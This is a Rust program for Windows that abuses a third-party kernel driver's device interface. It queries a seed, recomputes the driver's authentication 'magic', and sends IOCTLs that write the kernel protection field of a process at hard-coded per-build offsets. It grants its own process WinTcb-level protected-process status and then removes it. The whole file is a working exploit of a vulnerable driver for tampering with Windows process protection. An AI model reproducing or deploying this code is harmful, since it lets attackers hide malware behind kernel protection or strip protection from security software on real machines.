#![cfg_attr(
    all(not(debug_assertions), target_os = "windows"),
    windows_subsystem = "windows"
)]
#![allow(dead_code, unused_assignments, non_upper_case_globals)]

#[cfg(test)]
mod tests;

use clap::{Parser, ValueEnum};
use ntapi::{
    ntpsapi::{NtQueryInformationProcess, PS_PROTECTED_SIGNER, PS_PROTECTED_TYPE, PS_PROTECTION},
    ntrtl::RtlGetVersion,
};
use num::FromPrimitive;
use std::{ffi::OsStr, os::windows::ffi::OsStrExt};
use winapi::{
    shared::{
        minwindef::BOOL,
        ntdef::{NTSTATUS, NT_SUCCESS},
        ntstatus::STATUS_NOT_SUPPORTED,
    },
    um::{
        fileapi::{CreateFileW, OPEN_EXISTING},
        handleapi::INVALID_HANDLE_VALUE,
        ioapiset::DeviceIoControl,
        processthreadsapi::GetCurrentProcess,
        winnt::{GENERIC_READ, GENERIC_WRITE, HANDLE, OSVERSIONINFOW},
    },
};

#[derive(Parser, Debug)]
#[command(author, version, about, long_about = None)]
struct Args {
    #[arg(short, long, default_value = "\\\\.\\htsysm7F34")]
    device_name: String,

    #[arg(short = 't', long, value_enum, default_value_t = PsProtectedType::PsProtectedTypeProtected)]
    prot_type: PsProtectedType,

    #[arg(short = 's', long, value_enum, default_value_t = PsProtectedSigner::PsProtectedSignerWinTcb)]
    prot_signer: PsProtectedSigner,

    #[arg(short, long, default_value_t = false)]
    exit_on_done: bool,
}

#[derive(Debug)]
#[repr(C, align(4))]
pub struct WfshbrQuerySeed {
    is_success: u32,
    seed: u32,
}

#[derive(Debug)]
#[repr(C, align(4))]
pub struct WfshbrQueryRandom1 {
    is_success: u32,
    value_low: u32,
    value_high: u32,
}

#[derive(Debug)]
#[repr(C, align(4))]
pub struct WfshbrQueryRandom2 {
    is_success: u32,
    value: u32,
}

#[derive(Debug)]
#[repr(C, align(4))]
pub struct WfshbrFlagOperation {
    offset: u32,
    flags: u32,
    magic: u32,
}

#[derive(Debug)]
#[repr(C, align(4))]
pub struct WfshbrCommonResult {
    is_success: u32,
}

#[derive(Debug)]
pub enum WfshbrFlagOperationType {
    Add = 0,
    Remove = 1,
    And = 2,
}

#[derive(Debug)]
pub struct NtosOffsets {
    protection: u32,
}

#[derive(Clone, ValueEnum)]
enum PsProtectedSigner {
    PsProtectedSignerNone = 0,
    PsProtectedSignerAuthenticode = 1,
    PsProtectedSignerCodeGen = 2,
    PsProtectedSignerAntimalware = 3,
    PsProtectedSignerLsa = 4,
    PsProtectedSignerWindows = 5,
    PsProtectedSignerWinTcb = 6,
    PsProtectedSignerWinSystem = 7,
    PsProtectedSignerApp = 8,
    PsProtectedSignerMax = 9,
}

impl std::fmt::Debug for PsProtectedSigner {
    fn fmt(&self, f: &mut std::fmt::Formatter) -> std::fmt::Result {
        match self {
            PsProtectedSigner::PsProtectedSignerNone => write!(f, "PsProtectedSignerNone"),
            PsProtectedSigner::PsProtectedSignerAuthenticode => {
                write!(f, "PsProtectedSignerAuthenticode")
            }
            PsProtectedSigner::PsProtectedSignerCodeGen => write!(f, "PsProtectedSignerCodeGen"),
            PsProtectedSigner::PsProtectedSignerAntimalware => {
                write!(f, "PsProtectedSignerAntimalware")
            }
            PsProtectedSigner::PsProtectedSignerLsa => write!(f, "PsProtectedSignerLsa"),
            PsProtectedSigner::PsProtectedSignerWindows => write!(f, "PsProtectedSignerWindows"),
            PsProtectedSigner::PsProtectedSignerWinTcb => write!(f, "PsProtectedSignerWinTcb"),
            PsProtectedSigner::PsProtectedSignerWinSystem => {
                write!(f, "PsProtectedSignerWinSystem")
            }
            PsProtectedSigner::PsProtectedSignerApp => write!(f, "PsProtectedSignerApp"),
            PsProtectedSigner::PsProtectedSignerMax => write!(f, "PsProtectedSignerMax"),
        }
    }
}

impl FromPrimitive for PsProtectedSigner {
    fn from_u32(n: u32) -> Option<PsProtectedSigner> {
        return match n {
            0 => Some(PsProtectedSigner::PsProtectedSignerNone),
            1 => Some(PsProtectedSigner::PsProtectedSignerAuthenticode),
            2 => Some(PsProtectedSigner::PsProtectedSignerCodeGen),
            3 => Some(PsProtectedSigner::PsProtectedSignerAntimalware),
            4 => Some(PsProtectedSigner::PsProtectedSignerLsa),
            5 => Some(PsProtectedSigner::PsProtectedSignerWindows),
            6 => Some(PsProtectedSigner::PsProtectedSignerWinTcb),
            7 => Some(PsProtectedSigner::PsProtectedSignerWinSystem),
            8 => Some(PsProtectedSigner::PsProtectedSignerApp),
            9 => Some(PsProtectedSigner::PsProtectedSignerMax),
            _ => None,
        };
    }

    fn from_i64(n: i64) -> Option<PsProtectedSigner> {
        return self::FromPrimitive::from_u32(n as _);
    }

    fn from_u64(n: u64) -> Option<PsProtectedSigner> {
        return self::FromPrimitive::from_u32(n as _);
    }
}

#[derive(Clone, ValueEnum)]
enum PsProtectedType {
    PsProtectedTypeNone = 0,
    PsProtectedTypeProtectedLight = 1,
    PsProtectedTypeProtected = 2,
    PsProtectedTypeMax = 3,
}

impl std::fmt::Debug for PsProtectedType {
    fn fmt(&self, f: &mut std::fmt::Formatter) -> std::fmt::Result {
        match self {
            PsProtectedType::PsProtectedTypeNone => write!(f, "PsProtectedTypeNone"),
            PsProtectedType::PsProtectedTypeProtectedLight => {
                write!(f, "PsProtectedTypeProtectedLight")
            }
            PsProtectedType::PsProtectedTypeProtected => write!(f, "PsProtectedTypeProtected"),
            PsProtectedType::PsProtectedTypeMax => {
                write!(f, "PsProtectedTypeMax")
            }
        }
    }
}

impl FromPrimitive for PsProtectedType {
    fn from_u32(n: u32) -> Option<PsProtectedType> {
        return match n {
            0 => Some(PsProtectedType::PsProtectedTypeNone),
            1 => Some(PsProtectedType::PsProtectedTypeProtectedLight),
            2 => Some(PsProtectedType::PsProtectedTypeProtected),
            3 => Some(PsProtectedType::PsProtectedTypeMax),
            _ => None,
        };
    }

    fn from_i64(n: i64) -> Option<PsProtectedType> {
        return self::FromPrimitive::from_u32(n as _);
    }

    fn from_u64(n: u64) -> Option<PsProtectedType> {
        return self::FromPrimitive::from_u32(n as _);
    }
}

struct ProcessProtection(PS_PROTECTION);
impl std::fmt::Debug for ProcessProtection {
    fn fmt(&self, f: &mut std::fmt::Formatter) -> std::fmt::Result {
        writeln!(
            f,
            "{:?}, {}, {:?}",
            PsProtectedType::from_u32(self.0.Type() as u32),
            self.0.Audit() != 0,
            PsProtectedSigner::from_u32(self.0.Signer() as u32)
        )?;
        return Ok(());
    }
}

const IOCTL_WFSHBR_QUERY_SEED: u32 = 0xAA013840;
const IOCTL_WFSHBR_REMOVE_FLAG: u32 = 0xAA013880;
const IOCTL_WFSHBR_ADD_FLAG: u32 = 0xAA013884;
const IOCTL_WFSHBR_AND_FLAG: u32 = 0xAA013888;
const IOCTL_WFSHBR_QUERY_RANDOM_1: u32 = 0xAA0138C0;
const IOCTL_WFSHBR_QUERY_RANDOM_2: u32 = 0xAA0138C4;

const WINVER_WIN11_22H2: u32 = 22621;
const WINVER_WIN11_21H2: u32 = 22000;
const WINVER_WIN10_21H2: u32 = 19044;
const WINVER_WIN10_21H1: u32 = 19043;
const WINVER_WIN10_20H2: u32 = 19042;
const WINVER_WIN10_2004: u32 = 19041;
const WINVER_WIN10_1909: u32 = 18363;
const WINVER_WIN10_1903: u32 = 18362;
const WINVER_WIN10_1809: u32 = 17763;
const WINVER_WIN10_1803: u32 = 17134;
const WINVER_WIN10_1709: u32 = 16299;
const WINVER_WIN10_1703: u32 = 15063;
const WINVER_WIN10_1607: u32 = 14393;
const WINVER_WIN10_1511: u32 = 10586;
const WINVER_WIN10_1507: u32 = 10240;

const ProcessProtectionInformation: u32 = 0x3D;

fn to_wide_chars(s: &str) -> Vec<u16> {
    return OsStr::new(s)
        .encode_wide()
        .chain(Some(0).into_iter())
        .collect::<Vec<_>>();
}

fn kwfs_emul_check_flags(flags: u32) -> bool {
    let result: bool = flags.count_ones() < 9;
    return result;
}

fn open_device(device_name: &str) -> std::io::Result<HANDLE> {
    let device_name_wchar = to_wide_chars(device_name);
    let handle: HANDLE = unsafe {
        CreateFileW(
            device_name_wchar.as_ptr(),
            GENERIC_READ | GENERIC_WRITE,
            0,
            std::ptr::null_mut(),
            OPEN_EXISTING,
            0,
            std::ptr::null_mut(),
        )
    };
    if handle == INVALID_HANDLE_VALUE {
        return Err(std::io::Error::last_os_error());
    }
    return Ok(handle);
}

fn wfs_encrypt_phase2(pre_plain: u16) -> u32 {
    let mut current_pre_plain: u32 = pre_plain.into();
    let mut bitwise_pre_plain: u32 = 0;
    current_pre_plain += 1;
    current_pre_plain = current_pre_plain.wrapping_mul(0xB1F7);
    let temp: u64 = u64::from(0xFFFF0001 as u64).wrapping_mul(u64::from(current_pre_plain));
    bitwise_pre_plain = u32::from(temp.wrapping_shr(32) as u32);
    bitwise_pre_plain = bitwise_pre_plain.wrapping_shr(0x10);
    bitwise_pre_plain = bitwise_pre_plain.wrapping_mul(0x10001);
    current_pre_plain -= bitwise_pre_plain;
    current_pre_plain -= 1;
    return current_pre_plain;
}

fn wfs_encrypt_phase0(round: u32, plain: u32) -> u32 {
    let mut current_round: u32 = round;
    let mut cipher: u32 = 0;
    let mut xor_cipher: u32 = plain;
    let mut bitwise_cipher: u32 = round;
    while {
        if (current_round & 1) == 1 {
            cipher ^= xor_cipher;
        }
        bitwise_cipher = xor_cipher;
        xor_cipher = xor_cipher.wrapping_mul(2);
        bitwise_cipher = bitwise_cipher.wrapping_shr(0x1F);
        if bitwise_cipher != 0 {
            xor_cipher ^= 0x357935E9;
        }
        current_round = current_round.wrapping_shr(1);
        current_round != 0
    } {}
    return cipher;
}

fn wfs_encrypt_phase1(pre_plain: u32) -> u32 {
    let cipher1: u32 = wfs_encrypt_phase2((pre_plain & 0x0000FFFF) as _);
    let cipher2: u32 = wfs_encrypt_phase2(pre_plain.wrapping_shr(16) as _);
    let result: u32 = u32::from(cipher2.wrapping_shl(16)) + u32::from(cipher1);
    return result;
}

fn wfs_generate_magic(seed: u32, process_id: u32) -> u32 {
    let cipher_phase0: u32 = wfs_encrypt_phase0(0x77FD097E, seed + process_id);
    let cipher_phase1: u32 = wfs_encrypt_phase1(cipher_phase0);
    return cipher_phase1;
}

fn wfs_query_seed(device: HANDLE) -> std::io::Result<u32> {
    let mut bytes_returned: u32 = 0;
    let mut query: WfshbrQuerySeed = unsafe { std::mem::zeroed() };
    let result: BOOL = unsafe {
        DeviceIoControl(
            device,
            IOCTL_WFSHBR_QUERY_SEED,
            std::ptr::null_mut(),
            0,
            &mut query as *mut _ as _,
            std::mem::size_of::<WfshbrQuerySeed>() as _,
            &mut bytes_returned,
            std::ptr::null_mut(),
        )
    };
    if result.is_negative() {
        return Err(std::io::Error::last_os_error());
    }
    return Ok(query.seed);
}

fn wfs_query_random1(device: HANDLE) -> std::io::Result<u64> {
    let mut bytes_returned: u32 = 0;
    let mut query: WfshbrQueryRandom1 = unsafe { std::mem::zeroed() };
    let result: BOOL = unsafe {
        DeviceIoControl(
            device,
            IOCTL_WFSHBR_QUERY_RANDOM_1,
            std::ptr::null_mut(),
            0,
            &mut query as *mut _ as _,
            std::mem::size_of::<WfshbrQueryRandom1>() as _,
            &mut bytes_returned,
            std::ptr::null_mut(),
        )
    };
    if result.is_negative() {
        return Err(std::io::Error::last_os_error());
    }
    let value64: u64 =
        (u64::from(query.value_high).wrapping_shl(32) | u64::from(query.value_low)).into();
    return Ok(value64);
}

fn wfs_query_random2(device: HANDLE) -> std::io::Result<u32> {
    let mut bytes_returned: u32 = 0;
    let mut query: WfshbrQueryRandom2 = unsafe { std::mem::zeroed() };
    let result: BOOL = unsafe {
        DeviceIoControl(
            device,
            IOCTL_WFSHBR_QUERY_RANDOM_2,
            std::ptr::null_mut(),
            0,
            &mut query as *mut _ as _,
            std::mem::size_of::<WfshbrQueryRandom2>() as _,
            &mut bytes_returned,
            std::ptr::null_mut(),
        )
    };
    if result.is_negative() {
        return Err(std::io::Error::last_os_error());
    }
    return Ok(query.value);
}

fn wfs_flag_operation(
    device: HANDLE,
    operation_type: WfshbrFlagOperationType,
    seed: u32,
    offset: u32,
    flags: u32,
    bits_map_index: Option<u32>,
) -> std::io::Result<()> {
    let mut bytes_returned: u32 = 0;
    let mut operation: WfshbrFlagOperation = unsafe { std::mem::zeroed() };
    operation.offset = match bits_map_index {
        Some(index) => offset - index,
        None => offset,
    };
    operation.flags = match bits_map_index {
        Some(index) => flags.wrapping_shl(index * 8),
        None => flags,
    };
    assert!(kwfs_emul_check_flags(flags));
    let process_id: u32 = std::process::id();
    operation.magic = wfs_generate_magic(seed, process_id);
    let mut result: WfshbrCommonResult = unsafe { std::mem::zeroed() };
    let control_code: u32 = match operation_type {
        WfshbrFlagOperationType::Add => IOCTL_WFSHBR_ADD_FLAG,
        WfshbrFlagOperationType::Remove => IOCTL_WFSHBR_REMOVE_FLAG,
        WfshbrFlagOperationType::And => IOCTL_WFSHBR_AND_FLAG,
    };
    let result: BOOL = unsafe {
        DeviceIoControl(
            device,
            control_code,
            &mut operation as *mut _ as _,
            std::mem::size_of::<WfshbrFlagOperation>() as _,
            &mut result as *mut _ as _,
            std::mem::size_of::<WfshbrCommonResult>() as _,
            &mut bytes_returned,
            std::ptr::null_mut(),
        )
    };
    if result.is_negative() {
        return Err(std::io::Error::last_os_error());
    }
    if operation.offset == 0 {
        return Err(std::io::Error::new(
            std::io::ErrorKind::Other,
            "driver indicated faiure",
        ));
    }
    return Ok(());
}

fn set_process_protection(
    device: HANDLE,
    seed: u32,
    prot_type: PS_PROTECTED_TYPE,
    prot_audit: u8,
    prot_signer: PS_PROTECTED_SIGNER,
    unprotect: bool,
    bits_map_index: Option<u32>,
) -> std::io::Result<()> {
    let mut protection: PS_PROTECTION = unsafe { std::mem::zeroed() };
    protection.set_Type(prot_type as _);
    protection.set_Audit(prot_audit);
    protection.set_Signer(prot_signer as _);
    let offsets: NtosOffsets = parse_offsets()?;
    return wfs_flag_operation(
        device,
        match unprotect {
            true => WfshbrFlagOperationType::Remove,
            false => WfshbrFlagOperationType::Add,
        },
        seed,
        offsets.protection,
        protection.Level as _,
        bits_map_index,
    );
}

fn protect_process(
    device: HANDLE,
    seed: u32,
    prot_type: PS_PROTECTED_TYPE,
    prot_audit: u8,
    prot_signer: PS_PROTECTED_SIGNER,
    bits_map_index: Option<u32>,
) -> std::io::Result<()> {
    return set_process_protection(
        device,
        seed,
        prot_type,
        prot_audit,
        prot_signer,
        false,
        bits_map_index,
    );
}

fn protect_process_supreme(
    device: HANDLE,
    seed: u32,
    prot_type: PS_PROTECTED_TYPE,
    prot_audit: u8,
    prot_signer: PS_PROTECTED_SIGNER,
) -> std::io::Result<()> {
    for i in 0u32..3u32 {
        if let Ok(value) =
            protect_process(device, seed, prot_type, prot_audit, prot_signer, Some(i))
        {
            return Ok(value);
        }
    }

    return Err(std::io::Error::new(
        std::io::ErrorKind::Other,
        "no bitset flag map succeeded",
    ));
}

fn unprotect_process(
    device: HANDLE,
    seed: u32,
    prot_type: PS_PROTECTED_TYPE,
    prot_audit: u8,
    prot_signer: PS_PROTECTED_SIGNER,
    bits_map_index: Option<u32>,
) -> std::io::Result<()> {
    return set_process_protection(
        device,
        seed,
        prot_type,
        prot_audit,
        prot_signer,
        true,
        bits_map_index,
    );
}

fn unprotect_process_supreme(
    device: HANDLE,
    seed: u32,
    prot_type: PS_PROTECTED_TYPE,
    prot_audit: u8,
    prot_signer: PS_PROTECTED_SIGNER,
) -> std::io::Result<()> {
    for i in 0u32..3u32 {
        if let Ok(value) =
            unprotect_process(device, seed, prot_type, prot_audit, prot_signer, Some(i))
        {
            return Ok(value);
        }
    }

    return Err(std::io::Error::new(
        std::io::ErrorKind::Other,
        "no bitset flag map succeeded",
    ));
}

fn get_system_version() -> std::io::Result<(u32, u32, u32)> {
    let mut version_info: OSVERSIONINFOW = unsafe { std::mem::zeroed() };
    version_info.dwOSVersionInfoSize = std::mem::size_of::<OSVERSIONINFOW>() as _;
    let status: NTSTATUS = unsafe { RtlGetVersion(&mut version_info) };
    if !NT_SUCCESS(status) {
        return Err(std::io::Error::from_raw_os_error(status));
    }
    return Ok((
        version_info.dwMajorVersion,
        version_info.dwMinorVersion,
        version_info.dwBuildNumber,
    ));
}

fn parse_offsets() -> std::io::Result<NtosOffsets> {
    let mut offsets: NtosOffsets = unsafe { std::mem::zeroed() };
    let (major, minor, build) = get_system_version()?;
    if ((major * 10) + minor) != 100 {
        return Err(std::io::Error::from_raw_os_error(STATUS_NOT_SUPPORTED));
    }
    let _ = match build {
        WINVER_WIN11_22H2 | WINVER_WIN11_21H2 | WINVER_WIN10_21H2 | WINVER_WIN10_21H1
        | WINVER_WIN10_20H2 | WINVER_WIN10_2004 => {
            offsets.protection = 0x87A;
        }
        WINVER_WIN10_1909 | WINVER_WIN10_1903 => {
            offsets.protection = 0x6FA;
        }
        WINVER_WIN10_1809 | WINVER_WIN10_1803 | WINVER_WIN10_1709 | WINVER_WIN10_1703 => {
            offsets.protection = 0x6CA;
        }
        WINVER_WIN10_1607 => {
            offsets.protection = 0x6C2;
        }
        WINVER_WIN10_1511 => {
            offsets.protection = 0x6B2;
        }
        WINVER_WIN10_1507 => {
            offsets.protection = 0x6AA;
        }
        _ => return Err(std::io::Error::from_raw_os_error(STATUS_NOT_SUPPORTED)),
    };
    return Ok(offsets);
}

fn get_process_protection() -> std::io::Result<ProcessProtection> {
    let mut return_length: u32 = 0;
    let mut protection: PS_PROTECTION = unsafe { std::mem::zeroed() };
    let status: NTSTATUS = unsafe {
        NtQueryInformationProcess(
            GetCurrentProcess(),
            ProcessProtectionInformation,
            &mut protection as *mut _ as _,
            std::mem::size_of::<PS_PROTECTION>() as _,
            &mut return_length,
        )
    };
    if !NT_SUCCESS(status) {
        return Err(std::io::Error::from_raw_os_error(status));
    }
    return Ok(ProcessProtection(protection));
}

fn main() -> std::io::Result<()> {
    let args: Args = Args::parse();
    let (major, minor, build) = get_system_version().expect("error while parsing system version");
    println!("system: major({}) minor({}) build({})", major, minor, build);
    let offsets = parse_offsets().expect("your system is not supported");
    println!("offsets: {:?}", offsets);
    let handle: HANDLE = open_device(&args.device_name).expect("error while opening device");
    println!("device opened: {:p}", handle);
    let seed: u32 = wfs_query_seed(handle).expect("error while querying seed");
    println!("seed acquired: {:#x}", seed);
    let random1: u64 = wfs_query_random1(handle).expect("error while querying random1");
    println!("random1 acquired: {:#x}", random1);
    let random2: u32 = wfs_query_random2(handle).expect("error while querying random2");
    println!("random2 acquired: {:#x}", random2);
    let process_id: u32 = std::process::id();
    let magic: u32 = wfs_generate_magic(seed, process_id);
    println!("magic generated: {:#x}", magic);
    let mut current_prot: ProcessProtection =
        get_process_protection().expect("error while getting process protection");
    println!("current protection: {:?}", current_prot);
    let _ = protect_process_supreme(handle, seed, args.prot_type as _, 0, args.prot_signer as _)?;
    current_prot = get_process_protection().expect("error while getting process protection");
    println!("current protection: {:?}", current_prot);
    let _ = unprotect_process_supreme(handle, seed, args.prot_type as _, 0, args.prot_signer as _)?;
    current_prot = get_process_protection().expect("error while getting process protection");
    println!("current protection: {:?}", current_prot);
    if !args.exit_on_done {
        println!("waiting for inputs..");
        let _ = std::io::stdin().read_line(&mut String::new()).unwrap();
    }
    return Ok(());
}
